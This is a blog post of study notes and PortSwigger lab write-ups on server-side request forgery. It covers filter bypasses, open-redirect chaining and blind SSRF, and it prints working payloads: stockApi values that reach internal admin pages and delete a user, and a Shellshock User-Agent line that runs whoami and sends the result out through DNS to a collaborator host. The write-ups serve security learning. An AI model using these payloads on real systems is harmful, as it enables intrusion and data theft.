+++
title = 'Server-Side Request Forgery (SSRF)'
date = '2026-09-01T22:21:25+05:45'
draft = false
tags = []
featureimage = 'cover.jpeg'
+++


## What is SSRF?

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make request to an unintended location.

In a typical SSRF attack, the attacker might be able to make connection to internal only services or may be able to force the server to connect to arbitrary external systems which could leak sensitive data.

---

## What is the impact of SSRF attacks?

- Internal Data Exposure: Accesses hidden files or internal web pages which are normally blocked from the public internet.
- Cloud Metadata theft: Steals sensitive IAM (Identity & Access Management) credentials or configuration secrets.
- Network Mapping and Port Scanning: Forces the server to probe internal IP addresses and scan open ports to discover vulnerable back-end micro-services.
- Lateral Movement: Uses the compromised server as an entry point to launch further more complicated and sophisticated attack.
- Remote Code Execution: Triggers vulnerabilities in internal, unauthenticated services that trust local traffic.

---

## Common SSRF attacks:

SSRF attacks often exploit the trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions.

### SSRF attacks against the server:

In a SSRF attack against the server the attacker causes the application to make a HTTP request back to the server that is hosting the application via its loopback network interface. This typically uses a URL with a hostname like `127.0.0.1` or `localhost` . 

For example, image a shopping application that allows user to view whether an item is in stock in a particular store. To provide the information the application uses REST APIs. 

The browser makes the following request:

```jsx
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

This causes the server to make a request to the specified URL and retrieve the stock status and return this to the user.

If an attacker modify the request to specify a URL local to the server.

```jsx
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://localhost/admin
```

The server fetches the contents of the `/admin` URL and return it to the user. An attacker can visit the `/admin` but the administrative functionality is normally only accessible to authenticated users. So the attacker won’t see anything of interest but the request to `/admin` URL comes from the local machine, the normal access control are bypassed.

### Why do application implicitly trust requests that come from the local machine?

- The access control is applied in a different component that sits in front of the application server.
- For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine.
- The admin interface maybe listen on a different port number to the main application.

---

### LAB: Basic SSRF against the local server.

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

We are looking for this request:

![image.png](image.png)

When changing the stock api request link to [`http://localhost/admin`](http://localhost/admin) we got the admin page.

![image.png](image%201.png)

So change the stock api to `http:///localhost/admin/delete?username=carlos` . Then the lab should be solved.

![image.png](image%202.png)

---

### SSRF attacks against other back-end systems:

In some of the cases the application server is able to interact with back-end systems that are not directly reachable to users. These systems often have non-routable private IP addresses. Like in previous lab imagine there is an administrative interface at the back-end URL `http://192.168.0.68/admin` .

---

### LAB: Basic SSRF against another back-end system:

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

We are looking for this request:

![image.png](image%203.png)

Change the value of `stockApi` to [`http://192.168](http://192.0.0.168/).{placeholder}:8080/admin` and run the payload from 1 to 255 and see the response length to find the admin authorized ip address.

Do all of these in the intruder tab of the burpsuite.

![image.png](image%204.png)

I found the correct response at [`http://192.168.182:8080/admin`](http://192.168.0.182:8080/admin) 

So send the repeater and delete the user carlos.

![image.png](image%205.png)

---

## Bypass common SSRF defenses:

Some application block input containing hostname like `127.0.01` and `locahost` , or sensitive URL’s like `/admin` . Following techniques can be used to bypass these defenses:

- Use of alternate IP representation of `127.0.0.1` i.e. `2130706433` , `017700000001` , or `127.1`
- Register own domain name that resolves to 127.0.0.1. Burpsuite collaborator can be used for this purpose.
- Obfuscate blocked stings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL.

---

### LAB: SSRF with blacklist-based input filter:

[](https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-with-blacklist-filter)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

According to the context the vulnerability lies in the stock check URL. So, the request we are looking for is below:

![image.png](image%206.png)

The developer has kept some of the SSRF defenses. Some of them are like not allowing user to send internal ip like 127.0.0.1 or localhost.The developer also prevented the /admin or any kind of endpoint after the ip or domain so to bypass this encoding methods can be used This can be bypassed by various ways any way you find easy you can do it.

First I tried [`http://127.1/](http://127.1/)admin` it gave me error that said external calls are prohibited. So i tried `http://127.1/` it gave me a different error that said internal sever error and in the raw request i saw that the url was loading but there was nothing to show in the url. So i tried URL encoding the admin but it didn’t worked and i tried again by double URL encoding admin and it worked.

![image.png](image%207.png)

Then i add `/delete?username=carlos` behind my payload and i worked it deleted the carlos user.

The final payload that i use in the stockApi parameter:

```jsx
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

![image.png](image%208.png)

---

### SSRF with whitelist-based input filters:

Some application only allow inputs that match, a whitelist of permitted values. This is a good practice but there might be flaw when checking in the whitelist as some application might look for the match at the beginning of the input, or contained within it. This can be bypassed by exploiting inconsistencies in URL parsing.

> **The problem:** a URL string can contain the trusted hostname as a substring without pointing to it.
> 

#### Breakdown of each bypass technique:

1. Embedded credentials(`@`)

```jsx
https://expected-host:fakepassword@attacker-evil-host
```

In URL syntax, everything before `@` is userinfo (username:password), not the host. Some filter only check the near the front and passes it, but the browser client actually connects to `attacker-evil-host` .

1. Fragment(`#`)

```jsx
https://attacker-evil-host#expected-host
```

In URL syntax, everything after `@` is a fragment, meant for client-side user and it is not even sent to the server. A filter check “does the string contain expected-host” passes, but the actual network connection goes to `evil-host` .

1. Subdomain trick

```jsx
https://expected-host.attacker-evil-host
```

The filter sees `expected-host` at the start of the string and thinks that’s the domain but DNS hierarchy reads right-left, so `attacker-evil-host` is actually the real domain here, and the `expected-host` is just a subdomain label the attacker controls(since attacker owns `attacker-evil-host` and can create any subdomain of it).

1. URL encoding/ Double encoding

Characters like `@`, `#`, `.`, `/` can be percent-encoded (`%40`, `%23`, etc.). If the filter checks the raw string before decoding, but the actual HTTP library decodes it before connecting (or vice versa), the two components "see" different strings; one sees something safe, the other sees something malicious. Double-encoding (`%2540` decodes once to `%40`  decodes again to `@`) exploits situations where decoding happens more than once in the pipeline (e.g., once at a proxy/WAF layer, once at the app layer).

---

### Bypassing SSRF filters via open redirection:

It is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.

For example, the application contains an open redirection vulnerability in which the following URL:

```json
/product/nextProduct?currentProductId=6&path=http://attacker-evil-user.net
```

returns a redirection to:

```jsx
http://attacker-evil-user.net
```

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

---

### LAB: SSRF with filter bypass via open redirection vulnerablity

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

There are two vulnerabilities that we are looking for: The first one is general SSRF and another one is open redirection and chaining of two vulnerability will complete this exploit.

The general SSRF vulnerability is in stock check URL according to the context given by the lab.

![image.png](image%209.png)

So we found the open redirection vulnerability in the next product redirection in the bottom of the product page:

![image.png](image%2010.png)

![image.png](image%2011.png)

![image.png](image%2012.png)

So I change the `/product/stock` request to change the path which supports open redirection.

I did the url encoding to the path (use Ctrl + U in burpsuite for easier encoding)

![image.png](image%2013.png)

```json
stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin
```

So to delete the carlos user change accordingly:

```json
stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
```

![image.png](image%2014.png)

Then the lab must be solved!

---

## Blind SSRF vulnerabilities:

Blind SSRF occurs when you cause the application to send the back-end HTTP request but the response from the back-end is not reflected in the application’s front-end. Blind SSRF can be hard to exploit but can also result in remote code execution in some conditions.

---

### What is the impact of blind SSRF vulnerabilities?

The impact of blind SSRF vulnerabilities is often lower than fully informed SSRF vulnerabilities due to its one way nature. Although in some situations they can be also exploited to achieve full remote code execution.

---

### How to find and exploit blind SSRF vulnerabilities?

The most efficient way to detect if the web application is vulnerable to blind SSRF vulnerability is using out-of-band (OAST) *Out-of-Band Application Security Testing.* This involves attempting to send HTTP request to an external system that you control and monitor for network interactions with that system and for that the most easiest way to use can be Burp Collaborator.

> When testing for Blind SSRF vulnerabilities to observer a DNS look-up for the supplied collaborator domain but no subsequent HTTP request.
> 

 Simply getting an DNS lookup itself provide a route to exploit. It give me two exploitation path:

1. Internal network probing: Use the SSRF to blindly sweep internal IP ranges, sending the payloads that target known vulnerabilities. Combined with out-of-band (OOB) detection techniques (e.g., DNS/HTTP callbacks), this can surface unpatched internal systems even without seeing responses directly.
2. Reverse exploitation via malicious server: Force the web application to connect to tan attacker-controlled server, which returns malicious responses. If the server’s HTTP client has an exploitable vulnerability, this can lead to remote code execution within the back-end infrastructure.

---

### LAB: Blind SSRF with out-of-band detection:

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

According to the context give check the product page and in that change the referer to burp suite collaborator link and that should be it and the lab should be solved when the DNS request come in the collaborator. You might have to poll the request from the collaborator.

![image.png](image%2015.png)

![image.png](image%2016.png)

---

## Finding hidden attack surface for SSRF vulnerabilities:

Many server-side request forgery vulnerabilities are easy to find, because the application’s normal traffic involves request parameters containing full URLs.

---

### Partial URLs in request:

Some applications accept only a fragment of a URL (hostname, subdomain, or path segment) from user input and concatenate it server-side into a full request URL. Because the attacker doesn't control the entire URL, this is often dismissed as low-risk. However, exploitability frequently persists due to:

- **Parser confusion**: injecting characters like `@`, `#`, `\`, or `//` can cause the validation logic and the actual HTTP client to disagree on which host is really being contacted, allowing the attacker-controlled fragment to override the intended one.
- **Path-based authority injection**: a leading `//` in a path-only field can be interpreted as a scheme-relative URL, redirecting the request to an attacker-controlled host.
- **DNS control**: even when the hostname structure is fixed (e.g., `<input>.internal.example.com`), the attacker still controls DNS resolution for their portion, enabling blind SSRF detection via out-of-band callbacks (Burp Collaborator, etc.).
- **Fixed-host pivoting**: when the host is immutable but the path is attacker-controlled, the goal shifts from full SSRF to abusing sensitive internal endpoints reachable via that host.

**Testing approach:** identify which URL component the input populates, then test boundary characters (`@ # ? \ // ..%2f`), confirm outbound requests via an external listener, determine the URL-parsing library to find where validation and request logic diverge, and if the host is truly fixed, test path-based access to internal-only functionality.

---

### URLs within data formats:

Some data formats allow embedded URLs that get resolved by the parser when the data is processed. XML is the classic example: its DTD specification allows external entities to be defined, which reference a URL. When an application parses attacker-supplied XML without properly restricting external entity resolution, it becomes vulnerable to XML External Entity (XXE) injection.

XXE can be leveraged for SSRF: by defining an external entity pointing to an internal URL, the attacker causes the server's XML parser itself to make an outbound request on their behalf, potentially reaching internal-only systems, cloud metadata endpoints, or triggering out-of-band interactions for blind detection.

---

### SSRF via the Referer header:

Server-side analytics software often logs the `Referer` header to track which sites are linking in. To gather more context, this software will frequently follow the URL found in the `Referer` header, visiting the referring page to analyze its content or anchor text.

Because the `Referer` header is fully attacker-controlled (a client can set it to any value), this behavior creates an SSRF attack surface: an attacker can submit a request with a `Referer` header pointing to an internal URL or attacker-controlled listener, causing the server's analytics component to make an outbound request to that target.

Headers that seem purely informational (like `Referer`) can still be parsed and acted upon server-side. Any header value that might be fetched, resolved, or processed as a URL should be treated as SSRF attack surface, not just conventional request parameters.

---
## Lab: Blind SSRF with shellshock exploitation:

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

Install Collaborator Everywhere burpsuite extension for easy finding of vulnerable SSRF parameter.

When looking at the website the Collaborator Everywhere extension found two concerning things that are in the product view page.

The first thing is Referer which indicate Blind SSRF and second is user agent which might be vulnerable to the ShellShock exploit.

![1.png](1.png)

We use a basic shellshock exploit to find the user and in the referer we use intruder to find the username.

The shellshock exploit that was used is:

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).oum8yyrum1ube4w2youh099m8de42uqj.oastify.com
```

Then acccording to the context given by the lab we knew that the internal server is in [http://192.168.0](http://192.168.0).{}:8080/ so we used the intruder to find out which internal sever ip is correct
![2.png](2.png)

![3.png](3.png)

---
## Lab: SSRF with whitelist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.

The request we are looking for is the stock change request:

![4.png](4.png)

When the stockApi value is changed to anythink but [stock.weliketoshop.net](http://stock.weliketoshop.net/) it shows error. But when we give it username@stock.weliketoshop.net it said cant connect to stock service which showed it tried to parse username too. When we add # before @ it says the URL needs to stock.weliketoshop.net so we try encoding it and it worked while double encoding it.

![5.png](5.png)

So for admin we go to /admin

![6.png](6.png)

And while navigating through admin page we found /admin/delete?username=carlos

![7.png](7.png)

So this lab is solved.

---
Last two labs were in expert level of portswigger which meaned that they were a little difficult.

